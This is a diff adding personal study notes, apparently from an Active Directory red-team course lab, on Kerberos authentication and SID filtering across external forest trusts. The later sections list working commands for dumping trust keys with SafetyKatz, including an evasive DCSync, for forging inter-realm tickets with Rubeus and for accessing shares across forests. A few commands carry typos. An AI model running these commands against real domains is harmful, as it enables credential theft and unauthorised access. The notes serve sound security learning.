@@ -1,0 +1,81 @@
+#### Authentication for Across External Trusts
+- How does Kerberos work across External Trusts?
+	- **One difference between Internal and External Trusts is that Trust Keys for External Trusts do not expire like the Trust Keys for Internal Trusts might do.**
+		- Unless actual system administrators in both the forests do not agree, Trust keys across External Trusts do not change.
+	- ![[Pasted image 20250816190508.png]]
+	- Exactly the same as it would across Internal Trusts.
+	- That is if we have 2 different forests, let's assume Forest 1 and Forest 2, with Forest 1 DC and Forest 2 DC respectively.
+	- Let's say a client from Forest 1 wants to access an application in Forest 2, step 1 and 2 (preauth part) would follow the normal Kerberos authentication flow.
+	- In step 3, the client presents the TGT to the Forest 1 DC and requests a ST for an SPN in Forest 2's realm.
+	- In step 4, the DC finds out that the target service is not in its realm and responds with an inter-realm TGT.
+	- In step 5, The client presents the inter-realm TGT and requests a ST for the target service.
+		- At the end of step 5, the only verification done by the Forest 2 DC is if it can decrypt the inter-realm TGT using the Trust key.
+	- In step 6, if the Forest 2 DC can decrypt the inter-realm TGT, it responds with a TGS.
+	- In step 7, the client can use the issued TGS to access the target service.
+	- Step 8 is optional mutual authentication between the client and the target server.
+
+#### SID Filtering
+- As we discussed earlier, a Forest is the security boundary.
+- In some rare cases we can actually successfully perform attacks across External Trusts, but if the environment is working as intended by default, we are talking about the Forest being the security boundary, i.e. attacks across External Trusts may not be successful in general.
+- This is because of a policy known as SID Filtering, which is there to block exactly the attack we are performing, a SID History Injection attack.
+- A SID up to 1000 is a machine reserved SID, from 500 (assigned to the first Domain Admin) to 1000 (assigned to the first Domain Controller)
+- For any ticket crossing the trust boundary, which has a SID History between 500-1000, the SID History is automatically wiped off.
+- The ticket would be used, but it would be used so without the associated SID History.
+- We cannot directly inject an SID for Enterprise Admins, Domain Admins, Domain Controllers, Domain Users across Forest Trusts to perform a successful attack without a mis-configuration.
+- If we have a group called "Company Admins" in Forest 2, since it is user generated, we can assume that it has a RID of 1104.
+- If we know about the presence of such a group, before we are present in Forest 2, we can inject the SID History of this custom "Company Admins" group, since its SID is not filtered out; and access any resources we want; but not using the machine reserved SIDs.
+- We cannot even disable SID Filtering.
+- The only Trust relationship that allows SID History is the PIM Trust, which is used in the ESEA "Red Forest".
+	- In ESAE (Enhanced Security Admin Environment), Microsoft documented a “PIM Trust” (Privileged Identity Management Trust).
+	- This trust is a special external trust between the “red forest” (administrative forest) and production forests.
+	- It is explicitly configured to allow SIDHistory to flow so that admin accounts in the ESAE forest can project SIDs into the target forest and gain access without direct account creation in the production forests.
+	- This is the only supported case where SIDHistory is intentionally allowed across forest boundaries, and it’s tightly controlled.
+- So, essentially SIDs will always be filtered.
+- But, in a production environment, if we have trust relationships between two forests established, there will always be a reason for it.
+- From a system administrator's point of view, we will have business requirements where someone needs to access resources across forests, and would have had approval from the Infrastructure Head, and all we can do is configure it.
+- This means that there will be business requirements, and subsequently resources that would be accessible across forests, and that is the difference between a lab and a production environment.
+- We can only access explicitly shared resources across forests.
+- For example, if there is a resource (file share) in Forest 2, which is shared to any of the users in Forest 1, we can use that user to access the file share, but we cannot access any resource that is not explicitly shared.
+
+#### Attacking Across External Trusts
+- Attack Steps:
+	- ![[Pasted image 20250817024147.png]]
+	- The first step here would of course be to acquire the Trust key
+		- `SafetyKatz.exe -Command '"lsadump::trust /patch"'` or `SafetyKatz.exe -Command '"lsadump::lsa /path"'`
+	- In the lab, there is a file share called `SharedwithDcorp` on the `eurocorp.local` Forest, which is explicitly shared with the Domain Admins of dollarcorp.
+		- Since we can only access explicitly shared resources, we can only access this file share by performing any attack.
+	- Forge an inter-realm TGT using Rubeus:
+		- `C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:<RC4 Hash of the krbtgt account> /sid:-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap`
+			- The `/sids` flag denotes the SID History, the SID History here will be removed nonetheless, because of SID Filtering, and is not required but included to provide this context.
+			- It is also not recommended to include the SID History either, since it may be used for detection.
+	- Using the forged ticket:
+		- `C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<FORGED TICKET>`
+	- How to actually find the resources that are explicitly shared with us:
+		- If we have Domain Admin in one of the domains, we can look around at documentation, browser history, emails, internal portals and the like. This should be considered gathering information, not enumeration in the true sense.
+		- As far as enumeration goes, if we consider to do so, it will be very noisy in nature.
+			- Let's assume there are 10 machines in Forest 2, and we would like to check if we have access to any of the 10 machines:
+				- For file shares:
+					- Even if we use netview, we have to enumerate shares on each of the machine at a time by requesting a TGS for the CIFS service on all the 10 machines in Forest 2, and then trying to connect to them.
+				- For remote access:
+					- We have to request a TGS for HTTP on all the 10 machines in Forest 2 and then try to connect to them.
+			- This is the only way of enumeration across forest trusts.
+
+#### Learning Objective 20
+- With DA privileges on `dollarcorp.moneycorp.local`, get access to `SharedwithDCorp` share on the DC of `eurocorp.local` forest.
+	- We need to start off by extracting the Trust key, by performing a DCSync attack on the :
+		- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\ecorp$" "exit"`
+			- Here we dump the Trust key from the `ecorp$` machine account in Forest 1.
+	- Now, as a normal user, lets forge an inter-realm TGT, using the Trust key of the external trust:
+		- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:<RC4 of the krbtgt account> /sid:<base SID of the current domain> /ldap /user:Administrator /nowrap`
+	- Using the forged ticket:
+		- `C:\AD\Tools\Rubeus.exe asktgs /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt /ticket:<Forged Ticket>`
+		- `klist`
+	- Accessing the explicitly shared resource:
+		- `dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`
+			- This command should successfully work.
+		- `dir \\eurocorp-dc.eurocorp.local\c$`
+			- This command will not work, because we are not able to access any resources that are not explicitly shared.
+	- Enumerating explicitly shared resources:
+		- `net view \\eurocorp-dc.eurocorp.local\`
+			- This command will show us the available shares on `eurocorp-dc`.
+		- To still figure out if something is explicitly shared or not, we may need to try to connect to it.
